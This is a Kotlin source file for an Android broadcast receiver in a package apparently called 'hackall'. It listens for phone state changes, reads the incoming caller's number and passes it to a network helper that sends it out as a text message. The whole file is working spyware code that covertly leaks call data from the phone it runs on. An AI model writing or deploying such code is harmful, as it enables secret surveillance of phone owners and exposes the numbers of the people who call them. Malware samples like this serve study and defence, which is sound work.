package cocomelonc.hackall.broadcasts

import android.Manifest
import android.annotation.SuppressLint
import cocomelonc.hackall.tools.HackAllNetwork
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.telephony.TelephonyManager

class HackAllCallReceiver: BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            val incomingCallNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            if (incomingCallNumber != null) {
                if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_RINGING) {
                    HackAllNetwork(context).sendTextMessage("INCOMING CALL RINGING: $incomingCallNumber")
                }
                if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_IDLE ||
                    intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                    HackAllNetwork(context).sendTextMessage("INCOMING CALL IDLE: $incomingCallNumber")
                }
            }
        }
    }

    @SuppressLint("NewApi")
    fun isCallIncomePermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.CALL_PHONE)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }
}